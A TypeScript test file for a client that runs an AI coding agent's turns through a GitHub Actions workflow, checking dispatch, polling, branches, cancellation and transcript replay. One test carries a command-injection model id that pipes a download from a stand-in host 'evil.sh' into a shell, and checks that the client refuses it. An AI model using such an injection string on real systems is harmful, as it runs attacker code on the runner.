import { strict as assert } from 'node:assert'
import { test } from 'node:test'
import { ActionsSession, replayTranscript, type ActionsOptions } from './actions.js'
import type { DriverEvent, DriverStartOptions } from '@openagt/agent-driver'
import { EXECUTION, fakeGitHub, type Call, type FakeOptions } from './test-support.js'

/** A session against the fake, its turns started with `start`, the client's options over the fake's with `more`. */
function makeSession(opts: FakeOptions = {}, start: Partial<DriverStartOptions> = {}, more: Partial<ActionsOptions> = {}): { session: ActionsSession; calls: Call[] } {
  const { fetch, calls } = fakeGitHub(opts)
  // A fake clock that only the sleeps advance, so polling costs no wall-clock time and a run
  // that never finishes fails the test in ten polls instead of spinning for the real timeout.
  let clock = 0
  const session = new ActionsSession(
    {
      owner: 'o',
      repo: 'r',
      token: 't',
      workflow: 'agent.yml',
      fetch,
      pollIntervalMs: 1000,
      timeoutMs: 10_000,
      now: () => clock,
      sleep: async ms => void (clock += ms),
      ...more,
    },
    { cwd: '/ws', ...start },
  )
  return { session, calls }
}

test('a turn dispatches, polls, and returns the run transcript as a turn (#610)', async () => {
  const { session, calls } = makeSession({ agents: [{ status: 'queued' }, { status: 'in_progress' }, { status: 'completed', conclusion: 'success' }] })
  const turn = await session.prompt('add a --verbose flag')

  assert.equal(turn.text, 'Added the --verbose flag.')
  assert.equal(turn.sessionId, 'sess-abc')
  assert.deepEqual(turn.usage, { costUsd: 0.42, inputTokens: 120, outputTokens: 30, cacheReadTokens: 900, cacheCreationTokens: 40 })
  // It kept polling while the run was queued and in progress, rather than reading it early.
  assert.equal(calls.filter(c => c.url.includes('/actions/runs?')).length, 3)
})

test('a turn dispatches the prompt with a correlation id and the framing in front (#610)', async () => {
  const { session, calls } = makeSession({}, { system: 'You are careful.' })
  await session.prompt('do the thing', { system: 'Also: be brief.' })

  const dispatch = calls.find(c => c.url.includes('/dispatches'))!
  assert.match(dispatch.url, /\/repos\/o\/r\/actions\/workflows\/agent\.yml\/dispatches$/)
  const body = dispatch.body as { ref: string; inputs: Record<string, string> }
  assert.equal(body.ref, 'main')
  // The action takes the prompt as an input, so the framing can ride in front of it safely.
  assert.equal(body.inputs['prompt'], 'You are careful.\n\nAlso: be brief.\n\ndo the thing')
  // The dispatch API returns no run id, so the correlation id is the only way back to the run.
  assert.equal(body.inputs['correlation_id'], `${session.id}-turn-1`)
})

test('each session has a unique correlation prefix so a fresh process never matches a stale run (#1050)', async () => {
  // The host spawns a fresh process per turn, restarting the session counter, so without a
  // random tag two runs would both be `actions-1-...` and one could latch onto the other's run.
  const a = makeSession().session
  const b = makeSession().session
  assert.notEqual(a.id, b.id)
})

test('the session names the branch each run pushes to, stable across turns (#1085)', async () => {
  const { session, calls } = makeSession()
  await session.prompt('first')
  await session.prompt('second')

  const branches = calls.filter(c => c.url.includes('/dispatches')).map(c => (c.body as { inputs: Record<string, string> }).inputs['branch'])
  // The session names the branch instead of discovering it: the action leaves branch_name empty
  // for a workflow_dispatch run, so this is the only thing that lets readCode + continuity work.
  assert.equal(branches[0], `claude/${session.id}`)
  // Same branch every turn, so a later turn's push builds on the earlier one.
  assert.equal(branches[0], branches[1])
})

test('the next turn runs on the branch the last one pushed (#610)', async () => {
  const { session, calls } = makeSession()
  await session.prompt('first')
  await session.prompt('second')

  const dispatches = calls.filter(c => c.url.includes('/dispatches')).map(c => c.body as { ref: string })
  // Every turn is a fresh runner and a fresh checkout, so continuity is the branch, not the machine.
  assert.deepEqual(
    dispatches.map(d => d.ref),
    ['main', 'claude/issue-610'],
  )
})

test('a turn continues the agent session when it asks to resume (#714, #720)', async () => {
  const { session, calls } = makeSession()
  await session.prompt('first')
  await session.prompt('follow-up', { resume: true })

  const inputs = calls.filter(c => c.url.includes('/dispatches')).map(c => (c.body as { inputs: Record<string, string> }).inputs)
  assert.equal(inputs[0]!['resume_session_id'], undefined)
  assert.equal(inputs[1]!['resume_session_id'], 'sess-abc')
})

test('the model goes through (#628)', async () => {
  const { session, calls } = makeSession({}, { model: 'claude-opus-4-8' })
  await session.prompt('go')
  assert.equal((calls.find(c => c.url.includes('/dispatches'))!.body as { inputs: Record<string, string> }).inputs['model'], 'claude-opus-4-8')
})

test('a model id that could break out of the runner shell is refused (#610)', async () => {
  const { session } = makeSession({}, { model: 'opus"; curl evil.sh | sh #' })
  // The workflow composes its args from environment variables, and this is the belt to that
  // brace: an id that is not an id never reaches the runner at all.
  await assert.rejects(() => session.prompt('go'), /Refusing to pass an unsafe model/)
})

test('the turn fails when the run does, naming the run (#610)', async () => {
  const { session } = makeSession({ agents: [{ status: 'completed', conclusion: 'failure' }] })
  // A red run must not pass as a result, and the URL is the only way to see why it went red.
  await assert.rejects(() => session.prompt('go'), /concluded "failure".*runs\/77/s)
})

test('a turn gives up rather than polling a run forever (#610)', async () => {
  const { session } = makeSession({ agents: [{ status: 'in_progress' }] }, {}, { timeoutMs: 5000 })
  await assert.rejects(() => session.prompt('go'), /Timed out waiting/)
})

test('produced code is read off the pushed branch, since the runner is gone (#610)', async () => {
  const { session, calls } = makeSession({ contents: { 'src/cli.ts': 'export const verbose = true\n' } })
  await session.prompt('go')

  assert.equal(await session.readCode!('src/cli.ts'), 'export const verbose = true\n')
  // Read from the branch the run pushed, not from the default branch.
  assert.match(calls.at(-1)!.url, /\/contents\/src\/cli\.ts\?ref=claude%2Fissue-610$/)
})

test('it says so plainly when there is no branch to read code from yet (#610)', async () => {
  const { session } = makeSession()
  await assert.rejects(() => session.readCode!('src/cli.ts'), /only available after a run has pushed one/)
})

test('the run events replay for the dashboard, in a burst at the end (#610)', async () => {
  const events: DriverEvent[] = []
  const { session } = makeSession({}, { onEvent: e => events.push(e) })
  await session.prompt('go')

  assert.equal(events[0]?.type, 'start')
  assert.ok(events.some(e => e.type === 'text' && e.text === 'Adding the flag.'))
  assert.ok(events.some(e => e.type === 'action' && e.label === 'Edit'))
  assert.ok(events.some(e => e.type === 'action' && e.label.includes('runs/77')))
  assert.equal(events.at(-1)?.type, 'result')
})

test('a run that pushed in an earlier process goes on there: its turn starts on the branch and pushes to it (#2394)', async () => {
  const { session, calls } = makeSession({}, {}, { branch: 'claude/2026-11-19T10-00-00-000Z' })
  assert.equal(session.branch, 'claude/2026-11-19T10-00-00-000Z')
  await session.prompt('and the docs')
  const dispatch = calls.find(c => c.url.includes('/dispatches'))!.body as { ref: string; inputs: Record<string, string> }
  assert.equal(dispatch.ref, 'claude/2026-11-19T10-00-00-000Z')
  assert.equal(dispatch.inputs['branch'], 'claude/2026-11-19T10-00-00-000Z')
})

test('a Stop cancels the workflow run once it is found, and the turn is over, not failed (#2394)', async () => {
  const stop = new AbortController()
  const { session, calls } = makeSession({ agents: [{ status: 'queued' }, { status: 'in_progress' }] }, { stop: stop.signal })
  stop.abort()
  const turn = await session.prompt('go')
  assert.deepEqual(turn, { text: '', stopped: true })
  assert.ok(calls.some(c => c.method === 'POST' && c.url.endsWith('/actions/runs/77/cancel')))
  assert.equal(calls.some(c => c.url.includes('/artifacts')), false, 'a cancelled run has no transcript to read')
})

test('replayTranscript reads the action execution file with the existing stream parser (#610)', () => {
  const events: DriverEvent[] = []
  const turn = replayTranscript(EXECUTION, e => events.push(e))
  assert.equal(turn.text, 'Added the --verbose flag.')
  assert.equal(turn.sessionId, 'sess-abc')
  assert.deepEqual(
    events.map(e => e.type),
    // The parser announces the session id up front (#1322) before the conversation replays.
    ['session', 'text', 'action'],
  )
})

test('replayTranscript rejects a transcript that is not a message array (#610)', () => {
  // An empty turn from a crashed run is fine; a silently-empty turn from a shape we did
  // not recognize is not, since it would read as an agent that did nothing.
  assert.deepEqual(replayTranscript('[]'), { text: '' })
  assert.throws(() => replayTranscript('{"type":"result"}'), /not a JSON array/)
  assert.throws(() => replayTranscript('not json'), /Could not parse the run transcript/)
})
